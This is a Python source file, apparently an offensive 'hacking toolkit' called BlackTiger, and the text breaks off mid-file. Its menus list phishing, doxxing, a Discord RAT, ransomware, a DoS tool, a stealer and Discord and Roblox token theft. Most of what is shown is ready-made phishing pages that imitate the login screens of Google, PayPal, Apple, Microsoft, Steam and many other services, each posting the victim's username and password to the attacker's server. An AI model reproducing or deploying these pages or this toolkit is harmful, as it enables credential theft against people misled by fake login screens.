#!/usr/bin/env python3
# BlackTiger Tools - Cross-platform (Windows/Linux) - All 40 modules
# Repository: https://github.com/b0b72/BlackTiger

import os
import sys
import time
import json
import re
import subprocess
import threading
import socket
import random
import base64
import hashlib
import sqlite3
import zipfile
import shutil
import tempfile
import platform
from datetime import datetime
from urllib.parse import urlparse, urljoin

# ==================== OS DETECTION ====================
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"

def clear_screen():
    if IS_WINDOWS:
        os.system('cls')
    else:
        os.system('clear')

def get_home():
    if IS_WINDOWS:
        return os.environ.get('USERPROFILE', os.path.expanduser('~'))
    else:
        return os.path.expanduser('~')

def get_appdata():
    if IS_WINDOWS:
        return os.environ.get('APPDATA', os.path.join(get_home(), 'AppData', 'Roaming'))
    else:
        return os.path.join(get_home(), '.config')

def get_local_appdata():
    if IS_WINDOWS:
        return os.environ.get('LOCALAPPDATA', os.path.join(get_home(), 'AppData', 'Local'))
    else:
        return os.path.join(get_home(), '.local', 'share')

def ping_cmd(ip, count=4):
    if IS_WINDOWS:
        return ['ping', '-n', str(count), '-w', '1000', ip]
    else:
        return ['ping', '-c', str(count), '-W', '1', ip]

# ==================== GLOBAL CONFIG ====================
HOME = get_home()
BLACKTIGER_DIR = os.path.join(HOME, ".blacktiger")
OUTPUT_DIR = os.path.join(BLACKTIGER_DIR, "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

def timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def log_result(data):
    fname = os.path.join(OUTPUT_DIR, f"blacktiger_results_{timestamp()}.txt")
    with open(fname, 'w') as f:
        f.write(str(data))
    print(f"Results saved to: {fname}")

def get_centered_block(lines, terminal_width):
    max_len = max(len(line) for line in lines)
    padding = max(0, (terminal_width - max_len) // 2)
    return [" " * padding + line for line in lines]

# ==================== BANNER ====================
def print_banner():
    clear_screen()
    WHITE = "\033[38;2;255;255;255m"
    GRAY_LIGHT = "\033[38;2;180;180;180m"
    GRAY_MID = "\033[38;2;120;120;120m"
    GRAY_DARK = "\033[38;2;70;70;70m"
    RESET = "\033[0m"

    banner_lines = [
        "██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ████████╗██╗ ██████╗ ███████╗██████╗ ",
        "██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ╚══██╔══╝██║██╔════╝ ██╔════╝██╔══██╗",
        "██████╔╝██║     ███████║██║     █████╔╝        ██║   ██║██║  ███╗█████╗  ██████╔╝",
        "██╔══██╗██║     ██╔══██║██║     ██╔═██╗        ██║   ██║██║   ██║██╔══╝  ██╔══██╗",
        "██████╔╝███████╗██║  ██║╚██████╗██║  ██╗       ██║   ██║╚██████╔╝███████╗██║  ██║",
        "╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝       ╚═╝   ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝"
    ]
    banner_colors = [WHITE, WHITE, GRAY_LIGHT, GRAY_MID, GRAY_DARK, GRAY_DARK]

    terminal_width = shutil.get_terminal_size((100, 24)).columns

    for line, color in zip(banner_lines, banner_colors):
        padding = max(0, (terminal_width - len(line)) // 2)
        print(" " * padding + color + line + RESET)

    print(f"\nhttps://github.com/b0b72/BlackTiger\n")
    print(f"[+] Running on: {platform.system()} {platform.release()}")
    print(f"[+] Output directory: {OUTPUT_DIR}\n")

# ==================== MENU ====================
def print_menu(page=1):
    print_banner()

    WHITE = "\033[38;2;255;255;255m"
    GRAY_LIGHT = "\033[38;2;180;180;180m"
    GRAY_MID = "\033[38;2;120;120;120m"
    GRAY_DARK = "\033[38;2;70;70;70m"
    RESET = "\033[0m"

    terminal_width = shutil.get_terminal_size((100, 24)).columns

    if page == 1:
        col1 = [
            "┌─── Network Scanner ───┐",
            "│                       │",
            "│ [06] Web Vuln Scanner │",
            "│ [07] Web Info Scanner │",
            "│ [08] Web URL Scanner  │",
            "│ [09] IP Scanner       │",
            "│ [10] Port Scanner     │",
            "│ [11] IP Pinger        │",
            "└───────────────────────┘"
        ]

        col2 = [
            "┌──────── Osint ────────┐",
            "│                       │",
            "│ [12] Dox Create       │",
            "│ [13] Dox Tracker      │",
            "│ [16] Username Tracker │",
            "│ [17] Email Tracker    │",
            "│ [18] Email Lookup     │",
            "│ [19] Phone Lookup     │",
            "└───────────────────────┘"
        ]

        col3 = [
            "┌────── Utilities ──────┐",
            "│                       │",
            "│ [22] Phishing Attack  │",
            "│ [23] Password Decrypt │",
            "│ [24] Password Encrypt │",
            "│ [26] Search Database  │",
            "│ [27] Dark Web Links   │",
            "│ [28] IP Generator     │",
            "└───────────────────────┘"
        ]
    else:
        col1 = [
            "┌───────── PAID ────────┐",
            "│                       │",
            "│ [01] Python Obfuscator│",
            "│ [02] Discord RAT      │",
            "│ [03] Ransomware       │",
            "│ [04] Website DoS      │",
            "│ [05] Proxy Scraper    │",
            "│ [29] Stealer          │",
            "└───────────────────────┘"
        ]

        col2 = [
            "┌──── Virus Builder ────┐",
            "│                       │",
            "│ [29] Stealer          │",
            "│ [30] Malware          │",
            "│                       │",
            "│ ─── Discord Tools ─── │",
            "│ [31] Token Discord    │",
            "│ [32] Bot Discord      │",
            "└───────────────────────┘"
        ]

        col3 = [
            "┌── Discord/Roblox/Info ─┐",
            "│                        │",
            "│ [33] Webhook Discord   │",
            "│ [34] Discord Server    │",
            "│ [35] Nitro Generator   │",
            "│ [36] Roblox Cookie     │",
            "│ [37] Roblox Info       │",
            "│ [38] Roblox User       │",
            "└────────────────────────┘"
        ]

    combined_ui_lines = []
    column_gap = "     "

    for i in range(len(col1)):
        combined_row = col1[i] + column_gap + col2[i] + column_gap + col3[i]
        combined_ui_lines.append(combined_row)

    centered_ui_lines = get_centered_block(combined_ui_lines, terminal_width)

    print(GRAY_LIGHT)
    for row in centered_ui_lines:
        print(row)
    print(RESET)

    prompt_line = f"{GRAY_MID}─(blackti@blacktiger)─[~/BlackTiger/Menu-{page}]"
    nav_line = f"{GRAY_MID}[N] Next Page | [B] Back | [Q] Quit | [I] Install Dependencies"
    dollar_line = f"{GRAY_MID}$ {RESET}"

    print(prompt_line.center(terminal_width))
    print(nav_line.center(terminal_width))
    print(dollar_line.center(terminal_width), end="")

# ==================== INSTALL DEPENDENCIES ====================
def install_dependencies():
    print("\n[+] Installing dependencies...")

    if IS_WINDOWS:
        print("[+] Windows detected. Installing with pip...")
        subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
        packages = ['requests', 'cryptography', 'pillow', 'faker', 'psutil', 'phonenumbers', 'piexif', 'flask', 'dnspython', 'pynput']
        for pkg in packages:
            print(f"[+] Installing {pkg}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', pkg])
        print("[+] For scapy, install Npcap from: https://npcap.com/")
        print("[+] For discord.py, run: pip install discord.py")
        print("[+] For opencv-python, run: pip install opencv-python")
    else:
        print("[+] Linux detected. Installing with apt and pip...")
        subprocess.run(['sudo', 'apt', 'update'])
        subprocess.run(['sudo', 'apt', 'install', '-y', 'python3-pip', 'python3-venv', 'tcpdump', 'graphviz', 'libpcap-dev'])
        packages = ['requests', 'scapy', 'cryptography', 'pillow', 'faker', 'discord.py', 'psutil', 'phonenumbers', 'piexif', 'opencv-python', 'flask', 'dnspython', 'pynput']
        for pkg in packages:
            print(f"[+] Installing {pkg}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', pkg])

    print("\n[+] Dependencies installed successfully!")
    input("\nPress Enter to continue...")

# ==================== PHISHING PAGE GENERATORS ====================
def get_google_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Google</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{text-align:center;width:100%;max-width:400px}
.logo{font-size:48px;font-weight:bold;color:#4285f4;margin-bottom:30px}
.logo span:nth-child(2){color:#ea4335}
.logo span:nth-child(3){color:#fbbc05}
.logo span:nth-child(4){color:#34a853}
input{width:100%;padding:15px 20px;border:1px solid #dfe1e5;border-radius:24px;font-size:16px;margin:10px 0}
input:focus{outline:none;border-color:#4285f4;box-shadow:0 1px 6px rgba(32,33,36,0.28)}
.btn{background:#4285f4;color:white;border:none;padding:12px 30px;border-radius:4px;font-size:14px;cursor:pointer;margin:10px 5px}
.btn:hover{background:#357ae8}
.btn-secondary{background:#f8f9fa;color:#3c4043}
.links{color:#1a0dab;font-size:14px;margin-top:20px}
.links a{color:#1a0dab;text-decoration:none;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
<br>
<a href="#" style="color:#4285f4;font-size:14px;text-decoration:none">Forgot password?</a>
<div class="links">
<a href="#">Create account</a>
<a href="#">Privacy</a>
<a href="#">Terms</a>
</div>
</form>
</div>
</body></html>'''

def get_facebook_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:396px;text-align:center}
.logo{color:#1877f2;font-size:48px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin:8px 0}
input:focus{outline:none;border-color:#1877f2}
.btn{background:#1877f2;color:white;border:none;padding:14px;border-radius:6px;font-size:20px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#166fe5}
.btn-green{background:#42b72a}
.btn-green:hover{background:#36a420}
.divider{border-bottom:1px solid #dadde1;margin:20px 0}
.links a{color:#1877f2;text-decoration:none;font-size:14px}
</style>
</head>
<body>
<div class="container">
<div class="logo">facebook</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="links"><a href="#">Forgotten password?</a></div>
<div class="divider"></div>
<button class="btn btn-green">Create New Account</button>
</div>
</body></html>'''

def get_instagram_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px 50px;border:1px solid #dbdbdb;width:350px;text-align:center}
.logo{font-family:Georgia,serif;font-size:48px;font-weight:bold;margin-bottom:30px}
input{width:100%;padding:12px 16px;background:#fafafa;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;margin:6px 0}
input:focus{outline:none;border-color:#a8a8a8}
.btn{background:#0095f6;color:white;border:none;padding:10px;border-radius:8px;font-size:14px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#1877f2}
.divider{display:flex;align-items:center;margin:20px 0}
.divider::before,.divider::after{content:"";flex:1;border-bottom:1px solid #dbdbdb}
.divider span{padding:0 18px;color:#8e8e8e;font-size:13px}
.links a{color:#00376b;text-decoration:none;font-size:12px;padding:0 5px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Instagram</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log in</button>
</form>
<div class="divider"><span>OR</span></div>
<div class="links"><a href="#">Forgot password?</a></div>
</div>
</body></html>'''

def get_twitter_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Twitter</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:#000;padding:40px;width:400px;text-align:center}
.logo{color:white;font-size:40px;font-weight:bold;margin-bottom:30px}
.logo span{color:#1d9bf0}
input{width:100%;padding:16px 20px;border:1px solid #333;border-radius:4px;background:#000;color:white;font-size:18px;margin:8px 0}
input:focus{outline:none;border-color:#1d9bf0}
.btn{background:#1d9bf0;color:white;border:none;padding:14px;border-radius:9999px;font-size:18px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#1a8cd8}
.links a{color:#1d9bf0;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">𝕏 <span>Twitter</span></div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_tiktok_page():
    return '''<!DOCTYPE html>
<html>
<head><title>TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;width:400px;text-align:center}
.logo{font-size:36px;font-weight:bold;color:#000;margin-bottom:20px}
.logo span{color:#fe2c55}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#fe2c55}
.btn{background:#fe2c55;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#e0264a}
.links a{color:#161823;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Tik<span>Tok</span></div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_snapchat_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Snapchat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;width:380px;text-align:center}
.logo{font-size:40px;font-weight:bold;color:#fffc00;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#fffc00}
.btn{background:#fffc00;color:#000;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#e6e600}
.links a{color:#000;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">👻 Snapchat</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_linkedin_page():
    return '''<!DOCTYPE html>
<html>
<head><title>LinkedIn</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:400px;text-align:center}
.logo{color:#0a66c2;font-size:48px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#0a66c2}
.btn{background:#0a66c2;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#004182}
.links a{color:#0a66c2;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">in</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Join now</a></div>
</div>
</body></html>'''

def get_reddit_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Reddit</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#dae0e6;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{color:#ff4500;font-size:36px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#ff4500}
.btn{background:#ff4500;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#d93b00}
.links a{color:#0079d3;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">reddit</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_youtube_page():
    return '''<!DOCTYPE html>
<html>
<head><title>YouTube</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{text-align:center;width:400px}
.logo{font-size:40px;font-weight:bold;color:#ff0000;margin-bottom:20px}
.logo span{color:#282828}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#1a73e8}
.btn{background:#1a73e8;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#1558b0}
.links a{color:#1a73e8;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">▶ <span>YouTube</span></div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot email?</a> · <a href="#">Create account</a></div>
</div>
</body></html>'''

def get_amazon_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Amazon</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:30px;border:1px solid #ddd;border-radius:4px;width:350px}
.logo{font-size:32px;font-weight:bold;color:#ff9900;margin-bottom:20px;text-align:center}
input{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:4px;font-size:14px;margin:6px 0}
input:focus{outline:none;border-color:#ff9900}
.btn{background:#ffd814;color:#0f1111;border:none;padding:10px;border-radius:4px;font-size:14px;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#f7ca00}
.links a{color:#0066c0;text-decoration:none;font-size:13px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Amazon</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or mobile phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a></div>
</div>
</body></html>'''

def get_paypal_page():
    return '''<!DOCTYPE html>
<html>
<head><title>PayPal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f7f7f7;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:400px;text-align:center}
.logo{font-size:36px;font-weight:bold;color:#003087;margin-bottom:20px}
input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin:8px 0}
input:focus{outline:none;border-color:#003087}
.btn{background:#003087;color:white;border:none;padding:12px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#002266}
.links a{color:#003087;text-decoration:none;font-size:13px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">PayPal</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_apple_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Apple ID</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#f5f5f7;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:12px;width:380px;text-align:center}
.logo{font-size:40px;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #d2d2d7;border-radius:8px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#0071e3}
.btn{background:#0071e3;color:white;border:none;padding:14px;border-radius:8px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#0066cc}
.links a{color:#0071e3;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo"> Apple</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot Apple ID or password?</a> · <a href="#">Create yours</a></div>
</div>
</body></html>'''

def get_microsoft_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Microsoft</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Segoe UI,Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;width:400px;text-align:center}
.logo{font-size:32px;font-weight:bold;color:#0078d4;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#0078d4}
.btn{background:#0078d4;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#006abc}
.links a{color:#0078d4;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Microsoft</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Create one</a></div>
</div>
</body></html>'''

def get_yahoo_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Yahoo</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f5f6f8;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:white;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{font-size:36px;font-weight:bold;color:#6001d2;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #ddd;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#6001d2}
.btn{background:#6001d2;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#5001b0}
.links a{color:#6001d2;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Yahoo!</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_gmail_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
.container{text-align:center;width:400px}
.logo{font-size:40px;font-weight:bold;margin-bottom:20px}
.logo span:nth-child(1){color:#4285f4}
.logo span:nth-child(2){color:#ea4335}
.logo span:nth-child(3){color:#fbbc05}
.logo span:nth-child(4){color:#34a853}
input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#1a73e8}
.btn{background:#1a73e8;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#1558b0}
.links a{color:#1a73e8;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo"><span>G</span><span>m</span><span>a</span><span>i</span><span>l</span></div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot email?</a> · <a href="#">Create account</a></div>
</div>
</body></html>'''

def get_spotify_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Spotify</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Circular,Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:#121212;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{color:#1db954;font-size:40px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:14px 16px;border:1px solid #282828;border-radius:4px;background:#121212;color:white;font-size:16px;margin:8px 0}
input:focus{outline:none;border-color:#1db954}
.btn{background:#1db954;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#1aa34a}
.links a{color:#a7a7a7;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">Spotify</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_netflix_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Netflix</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#141414;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:rgba(0,0,0,0.75);padding:60px 68px;border-radius:4px;width:400px;text-align:center}
.logo{color:#e50914;font-size:44px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:16px 20px;border:0;border-radius:4px;background:#333;color:white;font-size:16px;margin:10px 0}
input:focus{outline:none;background:#454545}
.btn{background:#e50914;color:white;border:none;padding:16px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#f6121d}
.links a{color:#737373;text-decoration:none;font-size:14px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">NETFLIX</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
</div>
</body></html>'''

def get_steam_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Steam</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Motiva Sans,Helvetica,Arial,sans-serif;background:#1b2838;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:#2a3f5e;padding:40px;border-radius:4px;width:380px;text-align:center}
.logo{color:#fff;font-size:32px;font-weight:bold;margin-bottom:20px}
input{width:100%;padding:12px 14px;border:1px solid #1b2838;border-radius:4px;background:#1b2838;color:white;font-size:14px;margin:8px 0}
input:focus{outline:none;border-color:#66c0f4}
.btn{background:#66c0f4;color:#1b2838;border:none;padding:12px;border-radius:4px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;margin:10px 0}
.btn:hover{background:#4fa3d6}
.links a{color:#8f98a0;text-decoration:none;font-size:13px;padding:0 10px}
</style>
</head>
<body>
<div class="container">
<div class="logo">STEAM</div>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Steam Account Name" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> · <a href="#">Join Steam</a></div>
</div>
</body></html>'''

def get_discord_page():
    return '''<!DOCTYPE html>
<html>
<head><title>Discord</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#1e1f22;display:flex;justify-content:center;align-items:center;height:100vh}
.container{background:#2b2d31;padding:40px;border-radius:8px;width:380px;text-align:center}
.logo{color:#fff;font-size:32px;font-weight:bold;margin-bottom:20px}
.logo span{color:#5865f2}
input{width:100%;padding:14px 16px;border:0;border-radius:4px;background:#1e1f22;color:white;font-size:16px;margin:8px 0}
input:focus{outline:none;background:#2b2d31}
